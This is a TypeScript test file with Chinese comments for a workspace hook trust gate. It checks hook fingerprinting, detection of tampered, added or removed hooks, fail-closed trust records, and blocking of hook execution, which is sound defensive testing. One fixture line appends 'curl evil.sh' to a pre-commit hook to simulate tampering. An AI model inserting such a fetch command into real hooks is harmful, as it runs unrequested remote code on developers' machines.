/**
 * BI-06.9 · 工作区钩子信任准入门测试（内存 fs 注入，零真实盘 IO）。
 *
 * 覆盖：三态判定（none/untrusted/trusted）、清单指纹计算（文件名+sha256
 * 排序摘要）与变更检测（新增/删除/篡改 → stale 接受）、损坏 trust.json
 * fail closed、promptTrust 不放行不落盘、acceptTrust 闭环、verifyHook 对
 * untrusted/none 的钩子执行请求一律拦截。
 */
import { createHash } from "node:crypto";
import { describe, expect, test } from "bun:test";
import {
  TRUST_FILE_RELATIVE,
  WorkspaceTrustGate,
  hookEntryLine,
  hooksFingerprint,
} from "./workspace-trust";
import type { TrustFs } from "./workspace-trust";

/** 内存文件系统：路径 → 内容；目录由路径前缀隐式建模。 */
class MemFs implements TrustFs {
  readonly files = new Map<string, string>();

  exists(path: string): boolean {
    if (this.files.has(path)) return true;
    const prefix = path.endsWith("/") ? path : `${path}/`;
    for (const p of this.files.keys()) {
      if (p.startsWith(prefix)) return true;
    }
    return false;
  }

  readFile(path: string): string | null {
    return this.files.get(path) ?? null;
  }

  listFiles(path: string): string[] | null {
    if (!this.exists(path)) return null;
    const prefix = path.endsWith("/") ? path : `${path}/`;
    const names: string[] = [];
    for (const p of this.files.keys()) {
      if (p.startsWith(prefix)) {
        const rest = p.slice(prefix.length);
        if (!rest.includes("/")) names.push(rest);
      }
    }
    return names.sort();
  }

  writeFile(path: string, content: string): void {
    this.files.set(path, content);
  }
}

const ROOT = "/ws";
const HOOK_BODY = "#!/bin/sh\nbun test\n";

const hookPath = (name: string): string => `${ROOT}/.bi/hooks/${name}`;

function seedHooks(fs: MemFs, names: string[]): void {
  for (const name of names) {
    fs.writeFile(hookPath(name), `${HOOK_BODY}# ${name}\n`);
  }
}

function writeTrustRecord(
  fs: MemFs,
  fingerprint: string,
  acceptedAt = "2026-10-16T00:00:00.000Z",
): void {
  fs.writeFile(
    hookPath("trust.json"),
    `${JSON.stringify({ acceptedAt, fingerprint }, null, 2)}\n`,
  );
}

const trustedGateWith = (fs: MemFs, hooks: string[]): WorkspaceTrustGate => {
  seedHooks(fs, hooks);
  const gate = new WorkspaceTrustGate();
  writeTrustRecord(
    fs,
    hooksFingerprint(hooks.map((name) => ({ name, content: `${HOOK_BODY}# ${name}\n` }))),
  );
  return gate;
};

describe("BI-06.9 信任三态判定", () => {
  test("无 .bi/hooks 目录 → 'none'（无可信任面）", () => {
    const fs = new MemFs();
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("none");
  });

  test("有钩子、无 trust.json → 'untrusted'", () => {
    const fs = new MemFs();
    seedHooks(fs, ["pre-commit"]);
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("untrusted");
  });

  test("仅 trust.json 无钩子、指纹=空清单指纹 → 'trusted'（trust.json 不计入清单）", () => {
    const fs = new MemFs();
    writeTrustRecord(fs, hooksFingerprint([]));
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("trusted");
  });

  test("有钩子且 trust.json 指纹匹配 → 'trusted'", () => {
    const fs = new MemFs();
    trustedGateWith(fs, ["pre-commit", "post-merge"]);
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("trusted");
  });

  test("stale 接受：接受后篡改钩子内容 → 指纹失配 → 'untrusted'", () => {
    const fs = new MemFs();
    trustedGateWith(fs, ["pre-commit"]);
    fs.writeFile(hookPath("pre-commit"), `${HOOK_BODY}# pre-commit\ncurl evil.sh\n`);
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("untrusted");
  });

  test("stale 接受：接受后新增钩子文件 → 'untrusted'", () => {
    const fs = new MemFs();
    trustedGateWith(fs, ["pre-commit"]);
    seedHooks(fs, ["sneaky-post-commit"]);
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("untrusted");
  });

  test("stale 接受：接受后删除钩子文件 → 'untrusted'", () => {
    const fs = new MemFs();
    trustedGateWith(fs, ["pre-commit", "post-merge"]);
    fs.files.delete(hookPath("post-merge"));
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("untrusted");
  });

  test("trust.json 损坏（非 JSON）→ fail closed 'untrusted'", () => {
    const fs = new MemFs();
    seedHooks(fs, ["pre-commit"]);
    fs.writeFile(hookPath("trust.json"), "not-json{{{");
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("untrusted");
  });

  test("trust.json 缺 fingerprint 字段 → 'untrusted'", () => {
    const fs = new MemFs();
    seedHooks(fs, ["pre-commit"]);
    fs.writeFile(hookPath("trust.json"), JSON.stringify({ acceptedAt: "2026-10-16T00:00:00.000Z" }));
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("untrusted");
  });

  test("仅 trust.json 无钩子、记录指纹为陈旧值 → 'untrusted'", () => {
    const fs = new MemFs();
    writeTrustRecord(fs, "deadbeef-stale");
    expect(new WorkspaceTrustGate().trustState(ROOT, fs)).toBe("untrusted");
  });
});

describe("BI-06.9 清单指纹（文件名+sha256 排序摘要）", () => {
  test("hookEntryLine 形态 = `文件名:sha256(内容)`（与 node:crypto 独立计算一致）", () => {
    const expected = `pre-commit:${createHash("sha256").update(HOOK_BODY, "utf8").digest("hex")}`;
    expect(hookEntryLine("pre-commit", HOOK_BODY)).toBe(expected);
  });

  test("hooksFingerprint 排序不变性：条目顺序不同 → 同一指纹", () => {
    const a = hooksFingerprint([
      { name: "pre-commit", content: HOOK_BODY },
      { name: "post-merge", content: "#!/bin/sh\nlint\n" },
    ]);
    const b = hooksFingerprint([
      { name: "post-merge", content: "#!/bin/sh\nlint\n" },
      { name: "pre-commit", content: HOOK_BODY },
    ]);
    expect(a).toBe(b);
  });

  test("hooksFingerprint 变更检测：内容变 / 文件名变 / 增删条目 → 指纹变", () => {
    const base = hooksFingerprint([{ name: "pre-commit", content: HOOK_BODY }]);
    expect(hooksFingerprint([{ name: "pre-commit", content: `${HOOK_BODY}# tampered\n` }])).not.toBe(base);
    expect(hooksFingerprint([{ name: "other-hook", content: HOOK_BODY }])).not.toBe(base);
    expect(
      hooksFingerprint([
        { name: "pre-commit", content: HOOK_BODY },
        { name: "extra", content: "x" },
      ]),
    ).not.toBe(base);
  });

  test("空清单指纹 = sha256('')，且稳定可复现", () => {
    const empty = hooksFingerprint([]);
    expect(empty).toBe(createHash("sha256").update("", "utf8").digest("hex"));
    expect(hooksFingerprint([])).toBe(empty);
  });

  test("trust.json 路径常量固定为 .bi/hooks/trust.json", () => {
    expect(TRUST_FILE_RELATIVE).toBe(".bi/hooks/trust.json");
  });
});

describe("BI-06.9 promptTrust / acceptTrust 决策流", () => {
  test("promptTrust：返回待接受决策（当前指纹+钩子清单），不落盘、不直接放行", () => {
    const fs = new MemFs();
    seedHooks(fs, ["pre-commit", "post-merge"]);
    const gate = new WorkspaceTrustGate();
    const prompt = gate.promptTrust(ROOT, fs);
    expect(prompt.decision).toBe("pending-acceptance");
    expect(prompt.state).toBe("untrusted");
    expect(prompt.hooks).toEqual(["post-merge", "pre-commit"]);
    expect(prompt.fingerprint).toBe(
      hooksFingerprint([
        { name: "pre-commit", content: `${HOOK_BODY}# pre-commit\n` },
        { name: "post-merge", content: `${HOOK_BODY}# post-merge\n` },
      ]),
    );
    expect(prompt.acceptedAt).toBeUndefined();
    expect(fs.files.has(hookPath("trust.json"))).toBe(false);
    expect(gate.trustState(ROOT, fs)).toBe("untrusted");
  });

  test("promptTrust：已有 stale 记录 → acceptedAt 透出，state 仍 untrusted，仍不放行", () => {
    const fs = new MemFs();
    seedHooks(fs, ["pre-commit"]);
    writeTrustRecord(fs, "stale-fingerprint", "2026-01-01T00:00:00.000Z");
    const prompt = new WorkspaceTrustGate().promptTrust(ROOT, fs);
    expect(prompt.state).toBe("untrusted");
    expect(prompt.acceptedAt).toBe("2026-01-01T00:00:00.000Z");
    expect(prompt.decision).toBe("pending-acceptance");
    expect(prompt.fingerprint).not.toBe("stale-fingerprint");
  });

  test("acceptTrust 落盘 → trustState 变 'trusted'（用户显式接受闭环）", () => {
    const fs = new MemFs();
    seedHooks(fs, ["pre-commit"]);
    const gate = new WorkspaceTrustGate();
    expect(gate.trustState(ROOT, fs)).toBe("untrusted");
    const record = gate.acceptTrust(ROOT, fs);
    expect(typeof record.acceptedAt).toBe("string");
    expect(record.fingerprint).toBe(
      hooksFingerprint([{ name: "pre-commit", content: `${HOOK_BODY}# pre-commit\n` }]),
    );
    expect(gate.trustState(ROOT, fs)).toBe("trusted");
  });

  test("方法级 injectFs 生效（工单签名 trustState(root, injectFs)）：构造器无 fs 也可判 trusted", () => {
    const fs = new MemFs();
    const gate = trustedGateWith(fs, ["pre-commit"]);
    expect(gate.trustState(ROOT, fs)).toBe("trusted");
  });
});

describe("BI-06.9 verifyHook 钩子执行准入门", () => {
  test("trusted 工作区 → { allowed: true }", () => {
    const decision = new WorkspaceTrustGate().verifyHook(hookPath("pre-commit"), "trusted");
    expect(decision).toEqual({ allowed: true });
  });

  test("untrusted 工作区的钩子执行请求 → { allowed: false, reason: 'untrusted-workspace' }", () => {
    const decision = new WorkspaceTrustGate().verifyHook(hookPath("pre-commit"), "untrusted");
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toBe("untrusted-workspace");
  });

  test("none 工作区同样 fail closed（未建立信任即请求执行 → 拦截）", () => {
    const decision = new WorkspaceTrustGate().verifyHook(hookPath("pre-commit"), "none");
    expect(decision.allowed).toBe(false);
    expect(decision.reason).toBe("untrusted-workspace");
  });
});
